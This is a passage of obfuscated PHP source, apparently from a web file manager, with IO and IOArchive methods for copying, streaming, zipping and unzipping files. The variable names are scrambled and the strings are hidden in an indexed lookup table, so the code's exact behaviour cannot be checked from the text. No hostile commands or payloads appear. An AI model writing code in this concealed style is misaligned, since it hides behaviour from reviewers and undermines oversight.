$À‹£­™Ó[70] . $÷¼Ïş‡µ); } } self::copyMoveKeepInfo($é×¨Š™€, $¸ü€Ş˜š, $ŸŠÓø‰); return $ŸŠÓø‰; } private static function copyFile($ÍÎ‘§”ş, $’Ğç¢ÍÈ, $Ô½—¹²¸, $ÃÀ…Åğ¶, $‡ÈÕù´À, $‚’ºîú¿) { $×òöë— =& $_SERVER[–Ú¬çÁ]; $ÃÀ…Åğ¶ = $Ô½—¹²¸->getPath(rtrim($ÃÀ…Åğ¶, $×òöë—[8]) . $×òöë—[8] . $‡ÈÕù´À); $µõ¢á»Æ = $×òöë—[1177] . time() . rand_string(5); Hook::trigger($×òöë—[1178], $ÍÎ‘§”ş, $’Ğç¢ÍÈ, $Ô½—¹²¸, $ÃÀ…Åğ¶, $‡ÈÕù´À, $µõ¢á»Æ); if (self::driverIsSame($ÍÎ‘§”ş, $Ô½—¹²¸)) { if ($‚’ºîú¿) { $ĞÔÇ û = $Ô½—¹²¸->moveFile($’Ğç¢ÍÈ, $ÃÀ…Åğ¶); } else { $ĞÔÇ û = $Ô½—¹²¸->copyFile($’Ğç¢ÍÈ, $ÃÀ…Åğ¶); } Hook::trigger($×òöë—[1179], $ÍÎ‘§”ş, $’Ğç¢ÍÈ, $Ô½—¹²¸, $ÃÀ…Åğ¶, $‡ÈÕù´À, $ĞÔÇ û); self::copyMoveKeepInfo($ÍÎ‘§”ş, $’Ğç¢ÍÈ, $ĞÔÇ û); return $ĞÔÇ û; } $½Ø²“ğº = TEMP_FILES; if ($GLOBALS[$×òöë—[6]][$×òöë—[89]][$×òöë—[816]]) { $½Ø²“ğº = $GLOBALS[$×òöë—[6]][$×òöë—[89]][$×òöë—[816]]; } $«Ÿ¨Éê´ = $½Ø²“ğº; mk_dir($«Ÿ¨Éê´); $ÆØàâù¬ = $«Ÿ¨Éê´ . $µõ¢á»Æ; $“Å¯Âì¢ = $ÆØàâù¬; $ÆØàâù¬ = $ÍÎ‘§”ş->download($’Ğç¢ÍÈ, $ÆØàâù¬); $ÆØàâù¬ = $ÍÎ‘§”ş->iconvApp($ÆØàâù¬); if (substr($ÆØàâù¬, strlen($½Ø²“ğº)) == $½Ø²“ğº) { $‚’ºîú¿ = !0; } $ĞÔÇ û = $Ô½—¹²¸->upload($ÃÀ…Åğ¶, $ÆØàâù¬, $‚’ºîú¿); self::remove($“Å¯Âì¢); Hook::trigger($×òöë—[1179], $ÍÎ‘§”ş, $’Ğç¢ÍÈ, $Ô½—¹²¸, $ÃÀ…Åğ¶, $‡ÈÕù´À, $ĞÔÇ û); self::copyMoveKeepInfo($ÍÎ‘§”ş, $’Ğç¢ÍÈ, $ĞÔÇ û); return $ĞÔÇ û; } private static function copyMoveKeepInfo($ğàÆ¦¢, $„‹şÎÏİ, $£¸óæã¾) { if (!$£¸óæã¾) { return; } $Œ¯ú‰ˆ = $ğàÆ¦¢->info($„‹şÎÏİ); if (!is_array($Œ¯ú‰ˆ)) { return; } IO::setModifyTime($£¸óæã¾, $Œ¯ú‰ˆ[$_SERVER[–Ú¬çÁ][85]]); } public static function pathFather($‹±˜§”ş) { $¬¡şìã‘ = IO::init($‹±˜§”ş); $ÔÁÉ›Ù· = $¬¡şìã‘->pathFather($¬¡şìã‘->path); return $¬¡şìã‘->getPathOuter($ÔÁÉ›Ù·); } public static function fileOut($ÄêĞ¶•¯, $¡ÛØ¶Ú½ = false, $ö‚Ø‘—© = false, $¿æ ç·§ = '') { $²¤¼¯¼Æ = self::driverMake($ÄêĞ¶•¯); if ($²¤¼¯¼Æ->isFileOutServer()) { return $²¤¼¯¼Æ->fileOutServer($ÄêĞ¶•¯, $¡ÛØ¶Ú½, $ö‚Ø‘—©, $¿æ ç·§); } return $²¤¼¯¼Æ->fileOut($ÄêĞ¶•¯, $¡ÛØ¶Ú½, $ö‚Ø‘—©, $¿æ ç·§); } public static function fileOutImage($óÂå‹’Ç, $·øáÖ©ô = 250) { $½Â²Ë“ = array(250, 600, 1200, 2000, 3000, 5000); for ($†î¶å¹Ì = 0; $†î¶å¹Ì < count($½Â²Ë“); $†î¶å¹Ì++) { if ($†î¶å¹Ì == 0 && $·øáÖ©ô <= $½Â²Ë“[$†î¶å¹Ì]) { $·øáÖ©ô = $½Â²Ë“[$†î¶å¹Ì]; break; } else { if ($·øáÖ©ô > $½Â²Ë“[$†î¶å¹Ì - 1] && $·øáÖ©ô <= $½Â²Ë“[$†î¶å¹Ì]) { $·øáÖ©ô = $½Â²Ë“[$†î¶å¹Ì]; break; } else { if ($†î¶å¹Ì == count($½Â²Ë“) - 1 && $·øáÖ©ô > $½Â²Ë“[$†î¶å¹Ì]) { $·øáÖ©ô = $½Â²Ë“[$†î¶å¹Ì]; break; } } } } $ œ†÷«Ã = self::driverMake($óÂå‹’Ç); if ($ œ†÷«Ã->isFileOutServer()) { return $ œ†÷«Ã->fileOutImageServer($óÂå‹’Ç, $·øáÖ©ô); } return $ œ†÷«Ã->fileOutImage($óÂå‹’Ç, $·øáÖ©ô); } private static function driverIsSame($ïÛÆ•ß, $ØÜñµ) { $·ŒÄ»¦ğ =& $_SERVER[–Ú¬çÁ]; $Û¾Íõ = $ïÛÆ•ß->getType(); $å©–â‰ß = $ØÜñµ->getType(); if ($Û¾Íõ != $å©–â‰ß) { return !1; } if ($Û¾Íõ == $·ŒÄ»¦ğ[777]) { return !0; } if ($Û¾Íõ == $·ŒÄ»¦ğ[106]) { return !0; } if ($ïÛÆ•ß->pathDriver == $ØÜñµ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ˆêÔå—, $êî«ü) { $–Ìù×Á =& $_SERVER[–Ú¬çÁ]; if (!IO::exist($ˆêÔå—)) { return !1; } if (!IO::exist($êî«ü)) { IO::mkdir($êî«ü); } $µ¢ü‹«¶ = array_to_keyvalue(self::listAllSimple($ˆêÔå—), $–Ìù×Á[84]); $ÅİŞ¿û = array_to_keyvalue(self::listAllSimple($êî«ü), $–Ìù×Á[84]); $ëûÉ£ğ¶ = array(); $½•Í·§Ñ = array(); foreach ($µ¢ü‹«¶ as $­Ù¶Ø¶Š => $Û¢ïÕ£È) { if (isset($ÅİŞ¿û[$­Ù¶Ø¶Š])) { if ($Û¢ïÕ£È[$–Ìù×Á[75]] == 1) { continue; } if ($ÅİŞ¿û[$­Ù¶Ø¶Š][$–Ìù×Á[76]] == $Û¢ïÕ£È[$–Ìù×Á[76]]) { continue; } } if ($Û¢ïÕ£È[$–Ìù×Á[75]] == 1) { $½•Í·§Ñ[] = $êî«ü . $–Ìù×Á[8] . trim($­Ù¶Ø¶Š, $–Ìù×Á[8]); continue; } $‡ºÑ™ª = strstr(trim($­Ù¶Ø¶Š, $–Ìù×Á[8]), $–Ìù×Á[8]) ? get_path_father($­Ù¶Ø¶Š) : $–Ìù×Á[12]; $ëûÉ£ğ¶[] = array($–Ìù×Á[1180] => $Û¢ïÕ£È[$–Ìù×Á[86]], $–Ìù×Á[1181] => rtrim($êî«ü, $–Ìù×Á[8]) . $–Ìù×Á[8] . $‡ºÑ™ª, $–Ìù×Á[1182] => $Û¢ïÕ£È); } $ÑÀúÃ«Å = array($–Ìù×Á[224] => $ëûÉ£ğ¶, $–Ìù×Á[75] => $½•Í·§Ñ); Hook::trigger($–Ìù×Á[1183], $ˆêÔå—, $êî«ü, $ÑÀúÃ«Å); foreach ($½•Í·§Ñ as $Û¢ïÕ£È) { IO::mkdir($Û¢ïÕ£È); } foreach ($ëûÉ£ğ¶ as $Û¢ïÕ£È) { IO::copy($Û¢ïÕ£È[$–Ìù×Á[1180]], $Û¢ïÕ£È[$–Ìù×Á[1181]], REPEAT_REPLACE); } } public static function fileSubstr($€ü©ìÎ¨, $­¤ş†, $õ—õô‡† = false) { $â Šşƒ‰ =& $_SERVER[–Ú¬çÁ]; $¿‚çÒÂ = self::driverMake($€ü©ìÎ¨); $¡‚û†Ğè = $¿‚çÒÂ->size($€ü©ìÎ¨); $¾¶Î»Èş = $­¤ş†; $‰æÁÍÔ– = $õ—õô‡†; if ($­¤ş† < 0) { $­¤ş† = $¡‚û†Ğè + $­¤ş†; } if ($õ—õô‡† === !1) { $õ—õô‡† = $¡‚û†Ğè - $­¤ş†; } if ($­¤ş† + $õ—õô‡† > $¡‚û†Ğè) { $õ—õô‡† = $¡‚û†Ğè - $­¤ş†; } if (!$¡‚û†Ğè && $¿‚çÒÂ->getType() == $â Šşƒ‰[106] && !$¿‚çÒÂ->exist($€ü©ìÎ¨)) { $±ª×ç°Ó = get_path_this($€ü©ìÎ¨); $Ü“öŞñª = parse_url_query($±ª×ç°Ó); if (is_array($Ü“öŞñª) && isset($Ü“öŞñª[$â Šşƒ‰[32]])) { $±ª×ç°Ó = urldecode($Ü“öŞñª[$â Šşƒ‰[32]]); } throw new Exception($â Šşƒ‰[1184] . LNG($â Šşƒ‰[1185]) . $â Šşƒ‰[986] . clear_html($±ª×ç°Ó) . $â Šşƒ‰[12]); } if ($õ—õô‡† <= 0) { return $â Šşƒ‰[12]; } if ($­¤ş† < 0 || $­¤ş† >= $¡‚û†Ğè || $õ—õô‡† > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\x52\x65\141\x64\40\145\162\x72\x6f\x72\x21\40\163\x74\141\162\164\x3d{$­¤ş†}\x3b\x6c\145\x6e\x67\x74\x68\75{$õ—õô‡†}\x3b\x20\163\x69\x7a\145\75{$¡‚û†Ğè}\x3b"); } $¿ƒå„ = $¿‚çÒÂ->fileSubstr($€ü©ìÎ¨, $­¤ş†, $õ—õô‡†); if (!$¿ƒå„ && $õ—õô‡† && isset($GLOBALS[$â Šşƒ‰[1186]])) { throw new Exception($GLOBALS[$â Šşƒ‰[1186]][$â Šşƒ‰[1187]]); } return $¿ƒå„; } private static function driverMake(&$˜Û©ß½µ) { $öÔü÷š¥ =& $_SERVER[–Ú¬çÁ]; $áçÕñæ± = KodIO::parse($˜Û©ß½µ); if (!self::$driverListSystem) { $‰€˜Ÿçí = Model($öÔü÷š¥[787])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‰€˜Ÿçí, $öÔü÷š¥[452]); } if ($áçÕñæ±[$öÔü÷š¥[33]] == KodIO::KOD_IO && !self::$driverListSystem[$áçÕñæ±[$öÔü÷š¥[452]]]) { return !1; } $˜Û©ß½µ = $áçÕñæ±[$öÔü÷š¥[1188]]; $ŠÏ¬ñÙ = self::driverGet($áçÕñæ±, $˜Û©ß½µ); return $ŠÏ¬ñÙ; } private static function driverGet($Şš­²‡ì, &$åÉä’¢) { $ŒÀÑ˜ğ¤ =& $_SERVER[–Ú¬çÁ]; $ß÷ÅÄœı = $Şš­²‡ì[$ŒÀÑ˜ğ¤[1189]]; $æ‹¶åµ¥ = $Şš­²‡ì[$ŒÀÑ˜ğ¤[452]]; switch ($Şš­²‡ì[$ŒÀÑ˜ğ¤[33]]) { case KodIO::KOD_IO: $ùÕ²èü = self::$driverListSystem[$æ‹¶åµ¥]; break; case KodIO::KOD_SOURCE: $åÉä’¢ = $æ‹¶åµ¥ . $åÉä’¢; $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1191], $ŒÀÑ˜ğ¤[6] => $Şš­²‡ì); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $–‡”õ‘œ = $GLOBALS[$ŒÀÑ˜ğ¤[1192]]; self::$driverListUser = array_to_keyvalue($–‡”õ‘œ, $ŒÀÑ˜ğ¤[452]); } $ùÕ²èü = self::$driverListUser[$æ‹¶åµ¥]; break; case KodIO::KOD_SHARE_LINK: $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1193], $ŒÀÑ˜ğ¤[6] => $Şš­²‡ì); $¾Ğ §Ìú = Action($ŒÀÑ˜ğ¤[1194])->sharePathInfo($Şš­²‡ì[$ŒÀÑ˜ğ¤[84]]); $åÉä’¢ = $¾Ğ §Ìú[$ŒÀÑ˜ğ¤[181]]; if (!$¾Ğ §Ìú[$ŒÀÑ˜ğ¤[181]]) { $¸‹ó™ø = Model($ŒÀÑ˜ğ¤[642])->getInfo($¾Ğ §Ìú[$ŒÀÑ˜ğ¤[643]]); $åÉä’¢ = KodIO::clear($¸‹ó™ø[$ŒÀÑ˜ğ¤[1195]] . $Şš­²‡ì[$ŒÀÑ˜ğ¤[1188]]); $Şš­²‡ì[$ŒÀÑ˜ğ¤[538]] = $¸‹ó™ø; $Şš­²‡ì[$ŒÀÑ˜ğ¤[1171]] = $åÉä’¢; $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1196], $ŒÀÑ˜ğ¤[6] => $Şš­²‡ì); } break; case KodIO::KOD_SHARE_ITEM: $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1197], $ŒÀÑ˜ğ¤[6] => $Şš­²‡ì); $¸‹ó™ø = Model($ŒÀÑ˜ğ¤[642])->getInfo($Şš­²‡ì[$ŒÀÑ˜ğ¤[452]]); if ($¸‹ó™ø[$ŒÀÑ˜ğ¤[181]] == $ŒÀÑ˜ğ¤[222]) { $åÉä’¢ = KodIO::clear($¸‹ó™ø[$ŒÀÑ˜ğ¤[1195]] . $Şš­²‡ì[$ŒÀÑ˜ğ¤[1188]]); $Şš­²‡ì[$ŒÀÑ˜ğ¤[538]] = $¸‹ó™ø; $Şš­²‡ì[$ŒÀÑ˜ğ¤[1171]] = $åÉä’¢; $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1198], $ŒÀÑ˜ğ¤[6] => $Şš­²‡ì); } else { if (!$åÉä’¢) { $åÉä’¢ = $¸‹ó™ø[$ŒÀÑ˜ğ¤[181]]; } } break; default: $åÉä’¢ = $Şš­²‡ì[$ŒÀÑ˜ğ¤[84]]; $ùÕ²èü = array($ŒÀÑ˜ğ¤[1190] => $ŒÀÑ˜ğ¤[1199]); break; } $Öéù®µ = $Şš­²‡ì[$ŒÀÑ˜ğ¤[84]]; if (!isset(self::$driverCache[$Öéù®µ])) { $ÔÌÀ±Ê = strtolower($ùÕ²èü[$ŒÀÑ˜ğ¤[95]]); $ä Æ¼ø = $GLOBALS[$ŒÀÑ˜ğ¤[6]][$ŒÀÑ˜ğ¤[89]][$ŒÀÑ˜ğ¤[846]]; $¼æ›‡¡Ù = $ŒÀÑ˜ğ¤[74] . (isset($ä Æ¼ø[$ÔÌÀ±Ê]) ? $ä Æ¼ø[$ÔÌÀ±Ê] : ucfirst($ÔÌÀ±Ê)); if (!class_exists($¼æ›‡¡Ù)) { show_json("{$¼æ›‡¡Ù}\x20\156\x6f\x74\x20\x65\x78\x69\x73\164\163\x21", !1); } $â¿ÁÆ™ú = isset($ùÕ²èü[$ŒÀÑ˜ğ¤[6]]) ? $ùÕ²èü[$ŒÀÑ˜ğ¤[6]] : !1; self::$driverCache[$Öéù®µ] = new $¼æ›‡¡Ù($â¿ÁÆ™ú); } $¾©Œ¢çª = self::$driverCache[$Öéù®µ]; $¾©Œ¢çª->pathDriver = $ß÷ÅÄœı; $¾©Œ¢çª->pathBase = $ŒÀÑ˜ğ¤[12]; if (isset($ùÕ²èü[$ŒÀÑ˜ğ¤[6]][$ŒÀÑ˜ğ¤[1200]])) { $¾©Œ¢çª->pathBase = rtrim($ùÕ²èü[$ŒÀÑ˜ğ¤[6]][$ŒÀÑ˜ğ¤[1200]], $ŒÀÑ˜ğ¤[8]) . $ŒÀÑ˜ğ¤[8]; $åÉä’¢ = $¾©Œ¢çª->pathBase . ltrim($åÉä’¢, $ŒÀÑ˜ğ¤[8]); } $åÉä’¢ = $¾©Œ¢çª->getPath($åÉä’¢); if (isset($Şš­²‡ì[$ŒÀÑ˜ğ¤[1171]])) { $åÉä’¢ = $Şš­²‡ì[$ŒÀÑ˜ğ¤[1171]]; } $¾©Œ¢çª->path = $åÉä’¢; return $¾©Œ¢çª; } public static function errorTips($ÌóÈ”ÑÓ = false) { $ÊÚåê±² =& $_SERVER[–Ú¬çÁ]; static $Øë›º²Û = array(); $‰¾ç™š = 1000; if ($ÌóÈ”ÑÓ === -1) { return $Øë›º²Û ? $Øë›º²Û[count($Øë›º²Û) - 1] : $ÊÚåê±²[12]; } if ($ÌóÈ”ÑÓ === !1) { return implode($ÊÚåê±²[206], $Øë›º²Û); } if (count($Øë›º²Û) >= $‰¾ç™š) { $Øë›º²Û = array_slice($Øë›º²Û, $‰¾ç™š * 0.5, $‰¾ç™š); } $Øë›º²Û[] = $ÌóÈ”ÑÓ; write_log($ÊÚåê±²[163] . ACTION . $ÊÚåê±²[1201] . $ÌóÈ”ÑÓ, $ÊÚåê±²[1202]); } public static function getLastError($àıÔ¤®ç = '') { $¬ãÓŠ­ê = self::errorTips(-1); return $¬ãÓŠ­ê ? $¬ãÓŠ­ê : $àıÔ¤®ç; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‘‰í®¦ê; if ($‘‰í®¦ê) { return $‘‰í®¦ê; } $è·£Ã‚Ó = IO::init($_SERVER[–Ú¬çÁ][8]); return $è·£Ã‚Ó; } private static function iconvSystem($ğöûÌ›Ê) { return self::local()->iconvSystem($ğöûÌ›Ê); } private static function iconvApp($ÆŒ¯ğĞœ) { return self::local()->iconvApp($ÆŒ¯ğĞœ); } public static function zipFolder($¹ğí•û, $Èûä°Ó = "\x7a\x69\x70", $õ¦š±Öú = '', $üÒ±ªıÍ = REPEAT_RENAME) { $õà§Ù´À =& $_SERVER[–Ú¬çÁ]; $÷”æ¥¸— = IO::listPath($¹ğí•û); if (!$÷”æ¥¸—) { return !1; } $÷”æ¥¸— = array_merge($÷”æ¥¸—[$õà§Ù´À[82]], $÷”æ¥¸—[$õà§Ù´À[83]]); return self::zip($÷”æ¥¸—, $Èûä°Ó, $õ¦š±Öú, $üÒ±ªıÍ); } public static function zip($¤æ–õó‡, $ÊÙäƒµƒ = "\x7a\x69\x70", $›‡ÊÕÁ = '', $¶˜ç¼¼ = REPEAT_RENAME) { $á’¡È÷¢ =& $_SERVER[–Ú¬çÁ]; if (is_string($¤æ–õó‡) && $¤æ–õó‡) { $¤æ–õó‡ = array(array($á’¡È÷¢[84] => $¤æ–õó‡)); } $ìïÓ É§ = self::init($¤æ–õó‡[0][$á’¡È÷¢[84]]); $“ş“•³¡ = self::info($¤æ–õó‡[0][$á’¡È÷¢[84]]); $²ïæÙ = $á’¡È÷¢[12]; $±Ä÷É = $á’¡È÷¢[12]; $ˆêÕ÷Ê = $á’¡È÷¢[12]; if ($›‡ÊÕÁ && substr($›‡ÊÕÁ, -1, 1) != $á’¡È÷¢[8]) { $±Ä÷É = get_path_father($›‡ÊÕÁ); $ˆêÕ÷Ê = get_path_this($›‡ÊÕÁ); } else { $±Ä÷É = self::pathFather($“ş“•³¡[$á’¡È÷¢[84]]); $ˆêÕ÷Ê = $“ş“•³¡[$á’¡È÷¢[32]] . $á’¡È÷¢[10] . $ÊÙäƒµƒ; if (count($¤æ–õó‡) > 1) { $ªı¡Ï¥í = IO::info($±Ä÷É); $ˆêÕ÷Ê = $ªı¡Ï¥í[$á’¡È÷¢[32]] . $á’¡È÷¢[10] . $ÊÙäƒµƒ; } if ($›‡ÊÕÁ) { $±Ä÷É = $›‡ÊÕÁ; } } if ($ìïÓ É§->getType() == $á’¡È÷¢[106]) { $¿Ô°Ä”ú = self::init($±Ä÷É); $Å€Íİ€ã = $¿Ô°Ä”ú->getType() == $á’¡È÷¢[106] ? $±Ä÷É : get_path_father($ìïÓ É§->path); $Å€Íİ€ã = rtrim($Å€Íİ€ã, $á’¡È÷¢[8]) . $á’¡È÷¢[8]; mk_dir($Å€Íİ€ã); } else { $²ïæÙ = TEMP_FILES . $á’¡È÷¢[1203] . time() . rand_string(8) . $á’¡È÷¢[8]; mk_dir($²ïæÙ); file_put_contents($²ïæÙ . $á’¡È÷¢[1204], $á’¡È÷¢[12]); $Å€Íİ€ã = $²ïæÙ; } $±ı§ÔéÓ = IO::info($Å€Íİ€ã); if (!$±ı§ÔéÓ || !$±ı§ÔéÓ[$á’¡È÷¢[227]]) { show_json(LNG($á’¡È÷¢[1205]), !1); } $‹¾ùşÅ® = self::zipFileList($¤æ–õó‡, $²ïæÙ); foreach ($‹¾ùşÅ® as $‹î³¶ï© => $ ­ÖÜäô) { $‹¾ùşÅ®[$‹î³¶ï©] = self::iconvSystem($ ­ÖÜäô); } $¿ª·İ§ = get_filename_auto($Å€Íİ€ã . $ˆêÕ÷Ê, $á’¡È÷¢[12], $¶˜ç¼¼); KodArchive::create(self::iconvSystem($¿ª·İ§), $‹¾ùşÅ®); if (!IO::exist($¿ª·İ§)) { if ($²ïæÙ) { del_dir($²ïæÙ); } show_json(LNG($á’¡È÷¢[1206]), !1); } if (!$²ïæÙ) { return $¿ª·İ§; } $‹Ü«€ÀÓ = self::move($¿ª·İ§, $±Ä÷É, $¶˜ç¼¼); if ($²ïæÙ) { del_dir($²ïæÙ); } if (!$¿ª·İ§) { show_json(LNG($á’¡È÷¢[1206]), !1); } return $‹Ü«€ÀÓ; } public static function unzip($Ûá–·ıÕ, $ĞÕ··Ğ¾, $ÊŠı„ƒÉ = "\x2d\61", $ ˆ‘”é = "\x72\x65\x70\x6c\x61\143\x65") { $ÏÓ¾›‰Ü =& $_SERVER[–Ú¬çÁ]; $îœ²Ì© = parent::info($Ûá–·ıÕ); if (!$îœ²Ì©) { show_json(LNG($ÏÓ¾›‰Ü[1207]), !1); } $ò™‡ÂÔ‹ = IO::infoFullSimple($ĞÕ··Ğ¾); if (!$ò™‡ÂÔ‹) { $ĞÕ··Ğ¾ = IO::mkdir($ĞÕ··Ğ¾); } if (isset($ò™‡ÂÔ‹[$ÏÓ¾›‰Ü[181]]) && trim($ò™‡ÂÔ‹[$ÏÓ¾›‰Ü[84]], $ÏÓ¾›‰Ü[8]) != trim($ĞÕ··Ğ¾, $ÏÓ¾›‰Ü[8])) { $ŠüÕÊî“ = KodIO::make($ò™‡ÂÔ‹[$ÏÓ¾›‰Ü[180]]); $Ïã‰²µƒ = IO::fileNameAuto($ŠüÕÊî“, $ò™‡ÂÔ‹[$ÏÓ¾›‰Ü[32]], REPEAT_RENAME_FOLDER, !0); $ĞÕ··Ğ¾ = IO::mkdir($ŠüÕÊî“ . $Ïã‰²µƒ); } $ÊŠı„ƒÉ = $ÊŠı„ƒÉ && $ÊŠı„ƒÉ != $ÏÓ¾›‰Ü[1208] ? @json_decode($ÊŠı„ƒÉ, !0) : -1; $ÜØˆÌ„£ = self::unzipPart($Ûá–·ıÕ, $ÊŠı„ƒÉ); if (!$ÜØˆÌ„£ || !IO::exist($ÜØˆÌ„£[$ÏÓ¾›‰Ü[224]])) { show_json(LNG($ÏÓ¾›‰Ü[105]), !1); } $ø¥é¦¡ = $ÜØˆÌ„£[$ÏÓ¾›‰Ü[1209]][count($ÜØˆÌ„£[$ÏÓ¾›‰Ü[1209]]) - 1]; if ($ø¥é¦¡[$ÏÓ¾›‰Ü[1210]] == -1 || substr($ø¥é¦¡[$ÏÓ¾›‰Ü[32]], -1, 1) == $ÏÓ¾›‰Ü[8]) { $©«ŠşÓú = $ÜØˆÌ„£[$ÏÓ¾›‰Ü[1211]] . rand_string(10) . $ÏÓ¾›‰Ü[8]; mk_dir($©«ŠşÓú); $¶·¾¥ö = count($ÜØˆÌ„£[$ÏÓ¾›‰Ü[1209]]) == 1 ? IO::ext($Ûá–·ıÕ) : get_path_ext($ÜØˆÌ„£[$ÏÓ¾›‰Ü[224]]); $ğµÁ—§ = KodArchive::extract(self::iconvSystem($ÜØˆÌ„£[$ÏÓ¾›‰Ü[224]]), $©«ŠşÓú, $ø¥é¦¡[$ÏÓ¾›‰Ü[1210]], $Ïã‰²µƒ, $¶·¾¥ö); self::unzipErrorCheck($ğµÁ—§, array($ÏÓ¾›‰Ü[1212], $Ûá–·ıÕ, $¶·¾¥ö, $ĞÕ··Ğ¾, $ÜØˆÌ„£)); Hook::trigger($ÏÓ¾›‰Ü[1213], $©«ŠşÓú); recursion_dir($©«ŠşÓú, $ºşƒªÈ£, $’Îíêİ, 0); $™¡–ÖÙ© = array_merge($ºşƒªÈ£, $’Îíêİ); $ä÷¡¯ˆ£ = array(); foreach ($™¡–ÖÙ© as $©­ï‚À“) { $„åîÀšú = IO::move(self::iconvApp($©­ï‚À“), $ĞÕ··Ğ¾, $ ˆ‘”é); if ($„åîÀšú) { $ä÷¡¯ˆ£[] = $„åîÀšú; } } del_dir($©«ŠşÓú); } else { $„åîÀšú = IO::move($ÜØˆÌ„£[$ÏÓ¾›‰Ü[224]], $ĞÕ··Ğ¾, $ ˆ‘”é, get_path_this($ø¥é¦¡[$ÏÓ¾›‰Ü[32]])); if ($„åîÀšú) { $ä÷¡¯ˆ£[] = $„åîÀšú; } } return $ä÷¡¯ˆ£ ? $ä÷¡¯ˆ£ : !1; } public static function unzipList($—¤ ÜÈî) { $ş‹ØÏµ‰ =& $_SERVER[–Ú¬çÁ]; $ğ«âğ§ó = isset($—¤ ÜÈî[$ş‹ØÏµ‰[1214]]) ? $—¤ ÜÈî[$ş‹ØÏµ‰[1214]] : !1; $’ïÉš…Ã = isset($—¤ ÜÈî[$ş‹ØÏµ‰[1210]]) ? @json_decode($—¤ ÜÈî[$ş‹ØÏµ‰[1210]], !0) : -1; $Ùœá€Ñı = self::unzipPart($—¤ ÜÈî[$ş‹ØÏµ‰[84]], $’ïÉš…Ã); if (!$Ùœá€Ñı || !IO::exist($Ùœá€Ñı[$ş‹ØÏµ‰[224]])) { show_json(LNG($ş‹ØÏµ‰[105]), !1); } $—ÓÄ®ùŠ = $Ùœá€Ñı[$ş‹ØÏµ‰[1209]][count($Ùœá€Ñı[$ş‹ØÏµ‰[1209]]) - 1]; $¡ŒÊ­Ÿ = in_array(IO::ext($Ùœá€Ñı[$ş‹ØÏµ‰[224]]), array($ş‹ØÏµ‰[366], $ş‹ØÏµ‰[1215], $ş‹ØÏµ‰[1216], $ş‹ØÏµ‰[1217], $ş‹ØÏµ‰[1218], $ş‹ØÏµ‰[1219])); if (!$ğ«âğ§ó && ($—ÓÄ®ùŠ[$ş‹ØÏµ‰[1210]] == -1 || $¡ŒÊ­Ÿ)) { $¤¨™®Ì— = $Ùœá€Ñı[$ş‹ØÏµ‰[1211]] . get_path_this($Ùœá€Ñı[$ş‹ØÏµ‰[224]]) . $ş‹ØÏµ‰[1220]; if (!IO::exist($¤¨™®Ì—)) { $†ŞÛÛ„§ = $—ÓÄ®ùŠ[$ş‹ØÏµ‰[1210]] == -1 ? get_path_ext(IO::pathThis($—¤ ÜÈî[$ş‹ØÏµ‰[84]])) : get_path_ext($Ùœá€Ñı[$ş‹ØÏµ‰[224]]); $…·ÀÊ†Ë = KodArchive::listContent(self::iconvSystem($Ùœá€Ñı[$ş‹ØÏµ‰[224]]), !0, $†ŞÛÛ„§); self::unzipErrorCheck($…·ÀÊ†Ë, array($ş‹ØÏµ‰[1221], $—¤ ÜÈî, $Ùœá€Ñı)); @file_put_contents($¤¨™®Ì—, json_encode($…·ÀÊ†Ë[$ş‹ØÏµ‰[1222]])); } return @json_decode(IO::getContent($¤¨™®Ì—), !0); } IO::fileOut($Ùœá€Ñı[$ş‹ØÏµ‰[224]], $ğ«âğ§ó, get_path_this($—ÓÄ®ùŠ[$ş‹ØÏµ‰[32]])); die; } private static function zipFileList($õéİ“ïŸ, $¥–Ş‚ø½ = false) { $¶ƒæÔß¯ =& $_SERVER[–Ú¬çÁ]; $ƒó©Üãñ = array(); foreach ($õéİ“ïŸ as $º“¦ŞµÆ) { $òæÅ•èª = $º“¦ŞµÆ[$¶ƒæÔß¯[84]]; if ($¥–Ş‚ø½) { $òæÅ•èª = self::copy($º“¦ŞµÆ[$¶ƒæÔß¯[84]], $¥–Ş‚ø½, $¶ƒæÔß¯[838]); } else { $—‡Õ§ï¨ = self::init($º“¦ŞµÆ[$¶ƒæÔß¯[84]]); if ($—‡Õ§ï¨->getType() == $¶ƒæÔß¯[106]) { $òæÅ•èª = $—‡Õ§ï¨->path; } } if ($òæÅ•èª && self::local()->exist($òæÅ•èª)) { $ƒó©Üãñ[$º“¦ŞµÆ[$¶ƒæÔß¯[84]]] = $òæÅ•èª; } } if (!empty($ƒó©Üãñ)) { return array_values($ƒó©Üãñ); } show_json(LNG($¶ƒæÔß¯[1185]), !1); } private static function localFilePath($ÒÊÄöŒœ) { $« ùƒõ× =& $_SERVER[–Ú¬çÁ]; $î±æ„şÙ = KodIO::parse($ÒÊÄöŒœ); if ($î±æ„şÙ[$« ùƒõ×[33]] == KodIO::KOD_SOURCE) { $âš•¤íÒ = Model($« ùƒõ×[845])->fileInfoGet(KodIO::sourceID($ÒÊÄöŒœ)); if (!$âš•¤íÒ[$« ùƒõ×[84]]) { show_json($« ùƒõ×[1223], !1); } $ÒÊÄöŒœ = $âš•¤íÒ[$« ùƒõ×[84]]; } $«ÈµÎ§Ÿ = self::init($ÒÊÄöŒœ); if ($«ÈµÎ§Ÿ->pathParse[$« ùƒõ×[1171]]) { $ÒÊÄöŒœ = $«ÈµÎ§Ÿ->pathParse[$« ùƒõ×[1171]]; $«ÈµÎ§Ÿ = self::init($ÒÊÄöŒœ); } $¿†ÙÑ‚ñ = $«ÈµÎ§Ÿ->getType(); if ($¿†ÙÑ‚ñ == $« ùƒõ×[106] || $¿†ÙÑ‚ñ == $« ùƒõ×[1224]) { if (!$«ÈµÎ§Ÿ->exist($«ÈµÎ§Ÿ->path)) { show_json(LNG($« ùƒõ×[105]), !1); } return $«ÈµÎ§Ÿ->path; } return !1; } public static function unzipPart($½šé©°, $ğ•ÚöÉñ = -1) { $åü™†¤ş =& $_SERVER[–Ú¬çÁ]; 